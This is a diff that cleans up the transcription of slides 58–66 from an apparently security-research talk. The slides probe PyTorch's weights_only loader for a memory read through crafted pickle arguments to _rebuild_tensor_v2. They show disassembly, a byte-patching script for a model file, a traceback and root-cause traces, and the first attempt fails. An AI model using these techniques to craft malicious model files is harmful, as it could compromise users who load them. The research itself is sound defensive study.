+    (10,),
+    (1,),
+    False,
+    OrderedDict(),
+)
 ```
+
+*The red box on the disassembly (lines 38–97) corresponds to the red-boxed `storage = persistent_load(...)` in the pseudocode; the blue box (lines 98–145) corresponds to the blue-boxed `result = torch._utils._rebuild_tensor_v2(...)` block.*
 
 ## Slide 58
 
 ### **Quick Test v2 Function**
 
-##### 😆 "issue" exist too!
+😆 "issue" exist too!
 
-58
-
-
-> Recovered by OCR — confidence 90/100 on the text kept, 81/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
-```text
-"Quick Test v2 Function
-< we
-& "issue" exist too!
+```python
 import torch
 from collections import OrderedDict
 storage = torch.LongStorage([1,2,3,4,5,6,7,8,9,10])
 tensor = torch._utils._rebuild_tensor_v2(
-storage,
-storage_offset=1,
-size=(10,),
-stride=(1,),
-requires_grad=False,
-)
+        storage,
+        storage_offset=1,
+        size=(10,),
+        stride=(1,),
+        requires_grad=False,
+        backward_hooks=OrderedDict()
+    )
 print(tensor)
-10, 134860703830768]
-58
+```
+
+```text
+tensor([          2,        3,       4,       5,
+                  6,        7,       8,       9,
+                 10, 134860703830768])
 ```
 
 ## Slide 59
 
-Where to Patch?
-1
-2
-3
+### **Where to Patch?**
 
-59
-
-
-> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+```python
+import torch
+from collections import OrderedDict
+storage = torch.LongStorage([1,2,3,4,5,6,7,8,9,10])
+tensor = torch._utils._rebuild_tensor_v2(
+        storage,
+        storage_offset=0,
+        size=(10,),
+        stride=(1,),
+        requires_grad=False,
+        backward_hooks=OrderedDict()
+    )
+print(tensor)
+```
 
 ```text
-@: \x8@ PROTO 2
-"Wh t Pp t h? 23 GLOBAL 'torch._utils _rebuild_tensor_v2'
-ere tO ratcns 35: q BINPUT Q
-38: ( MARK
-39: X BINUNICODE 'storage'
-51: q BINPUT 1
-53: c GLOBAL ‘torch LongStorage'
-72: q BINPUT 2
-import torch 80: q BINPUT 3
-storage = torch.LongStorage([1,2,3,4,5,6,7,8,9,10]) 92: k BININT1 10
-tensor = torch._utils._rebuild_tensor_v2( 94: t TUPLE (MARK at 38)
-95: q BINPUT 5
-storage, 97: Q BINPERSID
-2 100: K BININT1 10
-stride=(1,), 103: q BINPUT 6
-requires_grad=False, 107: \x85 TUPLE1
-backward_hooks=OrderedDict() 108: q BINPUT 7
-110: \x89 NEWFALSE
-) 111: ¢ GLOBAL ‘collections OrderedDict'
-138: ) EMPTY_TUPLE
-139: R REDUCE
-140: q BINPUT 9
-142: t TUPLE (MARK at 37)
-143: q BINPUT 10
-145: R- REDUCE
-146: q BINPUT 11
-148: . STOP
-59
+  0: \x80 PROTO      2
+  2: c    GLOBAL     'torch._utils _rebuild_tensor_v2'
+ 35: q    BINPUT     0
+ 37: (    MARK
+ 38: (        MARK
+ 39: X            BINUNICODE 'storage'
+ 51: q            BINPUT     1
+ 53: c            GLOBAL     'torch LongStorage'
+ 72: q            BINPUT     2
+ 74: X            BINUNICODE '0'
+ 80: q            BINPUT     3
+ 82: X            BINUNICODE 'cpu'
+ 90: q            BINPUT     4
+ 92: K            BININT1    10
+ 94: t            TUPLE      (MARK at 38)
+ 95: q        BINPUT     5
+ 97: Q        BINPERSID
+ 98: K        BININT1    0
+100: K        BININT1    10
+102: \x85     TUPLE1
+103: q        BINPUT     6
+105: K        BININT1    1
+107: \x85     TUPLE1
+108: q        BINPUT     7
+110: \x89     NEWFALSE
+111: c        GLOBAL     'collections OrderedDict'
+136: q        BINPUT     8
+138: )        EMPTY_TUPLE
+139: R        REDUCE
+140: q        BINPUT     9
+142: t        TUPLE      (MARK at 37)
+143: q    BINPUT     10
+145: R    REDUCE
+146: q    BINPUT     11
+148: .    STOP
 ```
+
+*Numbered arrows map each Python argument to its pickle opcodes: (1, black) `storage_offset=0` → `98: BININT1 0`; (2, red) `size=(10,)` → `100: BININT1 10` / `102: TUPLE1`; (3, blue) `stride=(1,)` → `105: BININT1 1` / `107: TUPLE1`.*
 
 ## Slide 60
 
 ### **Failed**
 
-##### 1. Patch & Save
+**1. Patch & Save**
 
-##### 😭 Why?
-
-2. Load
-
-60
-
-
-> Recovered by OCR — confidence 86/100 on the text kept, 72/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
+```python
+patch = b'\x80\x02ctorch._utils...'
+with open("tensor/data.pkl","wb") as f:
+    f.write(patch)
+os.system("zip -r tensor.pt tensor/")
+```
 
 ```text
-Failed
-1. Patch & Save
-patch = b'\x8@\x@2ctorch._utils...'
-with open("tensor/data.pkl","wb") as f:
-f.write(patch)
-os.system("zip -r tensor.pt tensor/")
-2. Load
-import torch rd
-90000000: 8002 6374 6f72 6368 2e5f 7574 696c 730a ..ctorch._utils.
-00000010: 5f72 6562 7569 6c64 5f74 656e 736f 725f _rebuild_tensor_
-Q0000020: 7632 @a71 0028 2858 07 7374 6f72 v2.q.((X. stor
-@0000030: 6167 6571 0163 746f 7263 680a 4c6f 6e67 ageq.ctorch.Long
-00000040: 5374 6f72 6167 650a 7102 5801 30 Storage.q.X. e
-00000050: 7103 5803 63 7075 7104 4bQ@a 7471 q.X. cpuq.K.tq
-00000070: 636f 6c6c 6563 7469 6f6e 730a 4f72 6465 collections.Orde
-@0000080: 7265 6444 6963 740a 7108 2952 7109 7471 redDict.q.)Rq.tq
-@ Why?
-/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_subclasses/functional_tensor.py:279: UserWarning: Fail
-mpy' (Triggered internally at /pytorch/torch/csrc/utils/tensor_numpy.cpp:81. )
-cpu = _conversion_method_template(device=torch.device("cpu") )
-Traceback (most recent call last):
-File "/home/xuemo/pytorch-2.8.@/load.py", line 2, in <module>
-File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/serialization.py", line 1521, in load
-return _load(
-File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/serialization.py", line 2119, in _load
-result = unpickler.load()
-File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_weights_only_unpickler.py", line 409, in load
-result = func(xargs)
-File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_utils.py", line 225, in _rebuild_tensor_v2
-tensor = _rebuild_tensor(storage, storage_offset, size, stride)
-File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_utils.py", line 188, in _rebuild_tensor
-return t.set_(storage._untyped_storage, storage_offset, size, stride)
-RuntimeError: Trying to resize storage that is not resizable |
-60
+00000000: 8002 6374 6f72 6368 2e5f 7574 696c 730a  ..ctorch._utils.
+00000010: 5f72 6562 7569 6c64 5f74 656e 736f 725f  _rebuild_tensor_
+00000020: 7632 0a71 0028 2858 0700 0000 7374 6f72  v2.q.((X....stor
+00000030: 6167 6571 0163 746f 7263 680a 4c6f 6e67  ageq.ctorch.Long
+00000040: 5374 6f72 6167 650a 7102 5801 0000 0030  Storage.q.X....0
+00000050: 7103 5803 0000 0063 7075 7104 4b0a 7471  q.X....cpuq.K.tq
+00000060: 0551 4b01 4b0a 8571 064b 0185 7107 8963  .QK.K..q.K..q..c
+00000070: 636f 6c6c 6563 7469 6f6e 730a 4f72 6465  collections.Orde
+00000080: 7265 6444 6963 740a 7108 2952 7109 7471  redDict.q.)Rq.tq
+00000090: 0a52 710b 2e                             .Rq..
 ```
+
+*The byte `01` at offset `0x60` (in `4b01`) is highlighted with a red box.*
+
+**2. Load**
+
+```python
+import torch
+torch.load("tensor.pt")
+```
+
+😭 Why?
+
+```text
+/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_subclasses/functional_tensor.py:279: UserWarning: Fail
+mpy' (Triggered internally at /pytorch/torch/csrc/utils/tensor_numpy.cpp:81.)
+  cpu = _conversion_method_template(device=torch.device("cpu"))
+Traceback (most recent call last):
+  File "/home/xuemo/pytorch-2.8.0/load.py", line 2, in <module>
+    torch.load("tensor.pt")
+  File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/serialization.py", line 1521, in load
+    return _load(
+           ^^^^^^
+  File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/serialization.py", line 2119, in _load
+    result = unpickler.load()
+             ^^^^^^^^^^^^^^^^
+  File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_weights_only_unpickler.py", line 409, in load
+    result = func(*args)
+             ^^^^^^^^^^^
+  File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_utils.py", line 225, in _rebuild_tensor_v2
+    tensor = _rebuild_tensor(storage, storage_offset, size, stride)
+             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/xuemo/pytorch-2.8.0/.venv/lib/python3.12/site-packages/torch/_utils.py", line 188, in _rebuild_tensor
+    return t.set_(storage._untyped_storage, storage_offset, size, stride)
+           ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+RuntimeError: Trying to resize storage that is not resizable
+```
+
+*The final `RuntimeError` line is highlighted with a red box.*
 
 ## Slide 61
 
 ### **Root Cause**
 
-61
-
-
-> Recovered by OCR — confidence 81/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+```python
+storage = persistent_load(('storage', torch.LongStorage,
+                           '0', 'cpu', 10))
+result = torch._utils._rebuild_tensor_v2(
+    storage,
+    1,
+    (10,),
+    (1,),
+    False,
+    OrderedDict(),
+)
+```
 
 ```text
-“Root Cause
-t _ istent_load((‘st ' torch.Longst 1 persistent_load(saved_id) # serialization.py:2065
-result = torch. utils rebuild tensor v2( 3 | L zip_file.get_storage_from_record("data/0", 80) # serialization. py:2036
-(10,) 6 | L ¢10::Storage(
-(,), 7 | size=80,
-8 data=data_ptr
-False, — ,
-OrderedDict(), 9 | allocator=nullptr,
-) 10 | resizable=false) « xxx Key: No resizable xxx
-1 _rebuild_tensor_v2(storage, offset=1, size=(10,), stride=(1,)) # _utils.py:216
-2 L_ _rebuild_tensor(storage, 1, (10,), (1,)) # _utils.py:185
-3 L t.set_(untyped_storage, 1, (10,), (1,)) # _utils.py:188
-4 L_ set_storage_cpu_(result, storage, 1, [10], [1]) # TensorShape. cpp:376
-5 L_ resize_impl_cpu_(impl, [10], [1], resize_storage=true) # Resize.cpp:229
-6 l|maybe_resize_storage_cpu(self, 88) # Resize.h:44
-7 | new_size_bytes: 88
-8 | _storage.nbytes(): 8@ + Need Resize
-9 L_ resize_bytes_cpu(storage, 88) # Resize.cpp:93
-10 [+ TORCH_CHECK(storage->resizable(), ...|) # Resize.cpp:94
-11 LU «ee RuntimeError: Trying to resize ook
-12 xxx storage that is not resizable tok
-61
+1 persistent_load(saved_id) # serialization.py:2065
+2      |    └─ load_tensor(dtype=long, nbytes=80, ...) # serialization.py:2002
+3      |         └─ zip_file.get_storage_from_record("data/0", 80) # serialization.py:2036
+4      |         |
+5      |         |   // C++: torch/csrc/jit/python/init.cpp:1624
+6      |         └─ c10::Storage(
+7      |              size=80,
+8      |              data=data_ptr,
+9      |              allocator=nullptr,
+10     |              resizable=false)          ← *** Key: No resizable ***
 ```
+
+```text
+1  _rebuild_tensor_v2(storage, offset=1, size=(10,), stride=(1,))   # _utils.py:216
+2      └─ _rebuild_tensor(storage, 1, (10,), (1,))                   # _utils.py:185
+3        └─ t.set_(untyped_storage, 1, (10,), (1,))                  # _utils.py:188
+4          └─ set_storage_cpu_(result, storage, 1, [10], [1])        # TensorShape.cpp:376
+5            └─ resize_impl_cpu_(impl, [10], [1], resize_storage=true)  # Resize.cpp:229
+6              └─ maybe_resize_storage_cpu(self, 88)                 # Resize.h:44
+7                 | new_size_bytes: 88
+8                 | storage.nbytes(): 80 → Need Resize
+9              └─ resize_bytes_cpu(storage, 88)                      # Resize.cpp:93
+10               ├─ TORCH_CHECK(storage->resizable(), ...)           # Resize.cpp:94
+11               └─ *** RuntimeError: Trying to resize      ***
+12                  *** storage that is not resizable       ***
+```
+
+*Red boxes highlight `resizable=false)  ← *** Key: No resizable ***` (top tree, line 10); `maybe_resize_storage_cpu(self, 88)` through `storage.nbytes(): 80 → Need Resize` (bottom tree, lines 6–8); and `TORCH_CHECK(...)` through `storage that is not resizable` (bottom tree, lines 10–12).*
 
 ## Slide 62
 
 ### **False Positive**
 
-62
-
-
-> Recovered by OCR — confidence 86/100 on the text kept, 85/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+```python
+storage = torch.LongStorage([1,2,3,4,5,6,7,8,9,10])
+tensor = torch._utils._rebuild_tensor_v2(
+        storage,
+        storage_offset=1,
+        size=(10,),
+        stride=(1,),
+        requires_grad=False,
+        backward_hooks=OrderedDict()
+    )
+```
 
 ```text
-False Positive
-tensor = torch._utils._rebuild_tensor_v2( 2 _LegacyStorage.__new__() # storage.py:748
-3 L TypedStorage.__init__([1..10], dtype=long, device=cpu) # storage.py:839
-storage,
-t ffset=1 4 L _get_storage_from_sequence([1..10], long, cpu) # storage.py:594
-storage_o see's 5 L torch.tensor([1..10], dtype=long, device=cpu) # storage.py:614
-size=(10,), 6 L_ _empty_generic(size=[10], CPUAllocator) # EmptyTensor.cpp:177
-stride=(1,), 7 L StorageImpl( # EmptyTensor.cpp:187
-requires_grad=False, 8 size=80,
-backward_hooks=0rderedDict() 9 allocator=CPUALlocator,
-) 10 resizable=true)
-void resize_bytes_cpu(StorageImpl* storage, size_t size_bytes) {
-TORCH_CHECK(storage->resizable(), "Trying to resize storage that is not resizable");
-at::DataPtr new_data;
-if (size bytes != 0) {
-new_data = storage->allocator()->allocate(size_bytes) ;
-}
-const at::DataPtr& old_data = storage->data_ptr();
-const auto old_capacity = storage->nbytes();
-const auto copy_capacity = std::min(size_bytes, old_capacity);
-if (old_data != nullptr && copy_capacity > 0) {
-memcpy (new_data.get(), old_data.get(), copy_capacity);
-}
-storage->set_data_ptr_noswap(std: :move(new_data) );
+1  torch.LongStorage([1, 2, 3, 4, 5, 6, 7, 8, 9, 10])
+2      └─ _LegacyStorage.__new__()                                  # storage.py:748
+3        └─ TypedStorage.__init__([1..10], dtype=long, device=cpu)  # storage.py:839
+4          └─ _get_storage_from_sequence([1..10], long, cpu)        # storage.py:594
+5            └─ torch.tensor([1..10], dtype=long, device=cpu)       # storage.py:614
+6              └─ _empty_generic(size=[10], CPUAllocator)           # EmptyTensor.cpp:177
+7                └─ StorageImpl(                                    # EmptyTensor.cpp:187
+8                     size=80,
+9                     allocator=CPUAllocator,
+10                    resizable=true)
 ```
+
+*The `resizable=true)` line (10) is highlighted with a red box.*
+
+```cpp
+void resize_bytes_cpu(StorageImpl* storage, size_t size_bytes) {
+  TORCH_CHECK(storage->resizable(), "Trying to resize storage that is not resizable");
+
+  at::DataPtr new_data;
+  if (size_bytes != 0) {
+    new_data = storage->allocator()->allocate(size_bytes);
+  }
+  const at::DataPtr& old_data = storage->data_ptr();
+  const auto old_capacity = storage->nbytes();
+  const auto copy_capacity = std::min(size_bytes, old_capacity);
+  if (old_data != nullptr && copy_capacity > 0) {
+    memcpy(new_data.get(), old_data.get(), copy_capacity);
+  }
+  storage->set_data_ptr_noswap(std::move(new_data));
+  storage->set_nbytes(size_bytes);
+}
+```
+
+*The `new_data = storage->allocator()->allocate(size_bytes);` line is highlighted with a red box.*
 
 ## Slide 63
 
 ### **First Attempt Failed**
 
-😢 Not vulnerable
-
-63
-
-
-> Recovered by OCR — confidence 86/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
-
 ```text
-“First Attempt Failed
-\x8@ PROTO
-35: q BINPUT (4)
-375 ( MARK
-38: ( MARK
-39: X BINUNICODE 'storage'
-51: q BINPUT 1
-533) Cc GLOBAL ‘torch LongStorage'
-123'q BINPUT 2
-74: X BINUNICODE '@'
-80: q BINPUT 3
-82: X BINUNICODE 'cpu'
-90: q BINPUT 4
-92: K BININT1 10
-94: t TUPLE (MARK at 38)
-95: q BINPUT 5
-97: Q BINPERSID
-98: K BININT1 (4)
-100: K BININT1 10
-102: \x85 TUPLE1
-103: q BINPUT 6
-105: K BININT1 1
-107: \x85 TUPLE1
-108: q BINPUT 7
-110: \x89 NEWFALSE
-136: q BINPUT 8
-138: ) EMPTY_TUPLE
-139: R REDUCE
-140: q BINPUT 9
-T422 t TUPLE (MARK at 37)
-143: q BINPUT 10
-145: R REDUCE
-146: q BINPUT 14:
-148: . STOP
+  0: \x80 PROTO      2
+  2: c    GLOBAL     'torch._utils _rebuild_tensor_v2'
+ 35: q    BINPUT     0
+ 37: (    MARK
+ 38: (        MARK
+ 39: X            BINUNICODE 'storage'
+ 51: q            BINPUT     1
+ 53: c            GLOBAL     'torch LongStorage'
+ 72: q            BINPUT     2
+ 74: X            BINUNICODE '0'
+ 80: q            BINPUT     3
+ 82: X            BINUNICODE 'cpu'
+ 90: q            BINPUT     4
+ 92: K            BININT1    10
+ 94: t            TUPLE      (MARK at 38)
+ 95: q        BINPUT     5
+ 97: Q        BINPERSID
+ 98: K        BININT1    0
+100: K        BININT1    10
+102: \x85     TUPLE1
+103: q        BINPUT     6
+105: K        BININT1    1
+107: \x85     TUPLE1
+108: q        BINPUT     7
+110: \x89     NEWFALSE
+111: c        GLOBAL     'collections OrderedDict'
+136: q        BINPUT     8
+138: )        EMPTY_TUPLE
+139: R        REDUCE
+140: q        BINPUT     9
+142: t        TUPLE      (MARK at 37)
+143: q    BINPUT     10
+145: R    REDUCE
+146: q    BINPUT     11
+148: .    STOP
+```
+
+```python
 import torch
 from collections import OrderedDict
-storage =
-persistent_load(('storage'
-torch.LongStorage,
-result = torch.
-storage,
-(10,),
-(1,),
-False,
-OrderedDict(),
-_utils.
-_rebuild_tensor_v2(
-® Not vulnerable
-"cpu!
-63
-10) )
+storage = persistent_load(('storage',
+                           torch.LongStorage, '0', 'cpu', 10))
+result = torch._utils._rebuild_tensor_v2(
+    storage,
+    0,
+    (10,),
+    (1,),
+    False,
+    OrderedDict(),
+)
 ```
+
+😢 Not vulnerable
+
+*A red box surrounds disassembly lines 98–145 and, on the right, the `result = torch._utils._rebuild_tensor_v2(...)` block.*
 
 ## Slide 64
 
 ### **First Attempt Failed**
 
-- 🤔 What about this part?
-
-64
-
-
-> Recovered by OCR — confidence 85/100 on the text kept, 83/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.
+🤔 What about this part?
 
 ```text
-“First Attempt Failed
-\x8@ PROTO
-35: q BINPUT @
-B73 MARK
-38: ( MARK
-39: X BINUNICODE 'storage' ae .
-51: q BINPUT 1 ‘ What about this part?
-533) Cc GLOBAL ‘torch LongStorage' .
-72: q BINPUT , import torch
-Th: X BINUNICODE '@' from collections import OrderedDict
-eas net * storage = persistent_load(( ‘storage’
-90: q BINPUT 4 torch.LongStorage, '@', ‘cpu', 10))
-92: K BININT1 10 result = torch._utils._rebuild_tensor_v2(
-94: t TUPLE (MARK at 38) t
-95: q BINPUT 5 storage,
-97: Q BINPERSID Q,
-98: K BININT1 @
-100: K BININT1 10 (10,),
-102: \x85 TUPLE1 (1,),
-103: q BINPUT 6 False,
-105: K BININT1 1 .
-107: \x85 TUPLE1 OrderedDict(),
-108: q BINPUT 7 )
-110: \x89 NEWFALSE
-192.5 6 GLOBAL ‘collections OrderedDict'
-136: q BINPUT 8
-138: ) EMPTY_TUPLE
-139: R REDUCE
-140: q BINPUT 9
-142: t TUPLE (MARK at 37)
-143: q BINPUT 10
-145: R REDUCE
-146: q BINPUT 11 64
-148: . STOP
+  0: \x80 PROTO      2
+  2: c    GLOBAL     'torch._utils _rebuild_tensor_v2'
+ 35: q    BINPUT     0
+ 37: (    MARK
+ 38: (        MARK
+ 39: X            BINUNICODE 'storage'
+ 51: q            BINPUT     1
+ 53: c            GLOBAL     'torch LongStorage'
+ 72: q            BINPUT     2
+ 74: X            BINUNICODE '0'
+ 80: q            BINPUT     3
+ 82: X            BINUNICODE 'cpu'
+ 90: q            BINPUT     4
+ 92: K            BININT1    10
+ 94: t            TUPLE      (MARK at 38)
+ 95: q        BINPUT     5
+ 97: Q        BINPERSID
+ 98: K        BININT1    0
+100: K        BININT1    10
+102: \x85     TUPLE1
+103: q        BINPUT     6
+105: K        BININT1    1
+107: \x85     TUPLE1
+108: q        BINPUT     7
+110: \x89     NEWFALSE
+111: c        GLOBAL     'collections OrderedDict'
+136: q        BINPUT     8
+138: )        EMPTY_TUPLE
+139: R        REDUCE
+140: q        BINPUT     9
+142: t        TUPLE      (MARK at 37)
+143: q    BINPUT     10
+145: R    REDUCE
+146: q    BINPUT     11
+148: .    STOP
 ```
+
+```python
+import torch
+from collections import OrderedDict
+storage = persistent_load(('storage',
+                           torch.LongStorage, '0', 'cpu', 10))
+result = torch._utils._rebuild_tensor_v2(
+    storage,
+    0,
+    (10,),
+    (1,),
+    False,
+    OrderedDict(),
+)
+```
+
+*A red box surrounds disassembly lines 38–97 and, on the right, the two `storage = persistent_load((...))` lines.*
 
 ## Slide 65
 
 ### **A Quick Look at persistent_load**
 
-65
-
-
-> Recovered by OCR — confidence 87/100 on the text kept, 83/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**
+```python
+import torch
+from collections import OrderedDict
+storage = persistent_load(('storage',
+                           torch.LongStorage, '0', 'cpu', 10))
+result = torch._utils._rebuild_tensor_v2(
+    storage,
+    0,
+    (10,),
+    (1,),
+    False,
+    OrderedDict(),
+)
+```
 
 ```text
-“A Quick Look at persistent load
-import torch def persistent_load(saved_id):
-from collections import OrderedDict assert isinstance(saved_id, tuple)
-storage = persistent_load(('storage', typename = _maybe_decode_ascii(saved_id[@] )
-data = saved_id[1:]
-assert typename == "storage", (
-torch.LongStorage, ‘'@', ‘cpu', 10
-result = torch._utils._rebuild_tensor_v2(
-storage, “Unknown typename for persistent_load,
-Q, cted 'storage' but got '{typename}'"
-(10,), )
-(1,), storage_type, key, location, numel = data
-False, dtype = storage_type.dtype
-OrderedDict(), nbytes = numel x torch._utils._element_size(dtype)
-) typed_storage = load_tensor(
-dtype, nbytes, key,
-_maybe_decode_ascii( location)
-00000010: 03 04
-00000020: @5 06
-00000030: 07 68
-00000040:
-65
+[(.venv) xuemo>xxd tensor/data/0
+00000000: 0100 0000 0000 0000 0200 0000 0000 0000
+00000010: 0300 0000 0000 0000 0400 0000 0000 0000
+00000020: 0500 0000 0000 0000 0600 0000 0000 0000
+00000030: 0700 0000 0000 0000 0800 0000 0000 0000
+00000040: 0900 0000 0000 0000 0a00 0000 0000 0000
 ```
+
+```python
+def persistent_load(saved_id):
+    assert isinstance(saved_id, tuple)
+    typename = _maybe_decode_ascii(saved_id[0])
+    data = saved_id[1:]
+    assert typename == "storage", (
+        f"Unknown typename for persistent_load,
+            expected 'storage' but got '{typename}'"
+    )
+    storage_type, key, location, numel = data
+    dtype = storage_type.dtype
+    nbytes = numel * torch._utils._element_size(dtype)
+    typed_storage = load_tensor(
+        dtype, nbytes, key,
+                _maybe_decode_ascii(location)
+    )
+    return typed_storage
+```
+
+*Two arrows link the definition to its inputs: a red arrow connects `numel = data` to the `10` in `torch.LongStorage, '0', 'cpu', 10))`; a blue arrow connects the `'0'` key to the `xxd tensor/data/0` dump below.*
 
 ## Slide 66
 
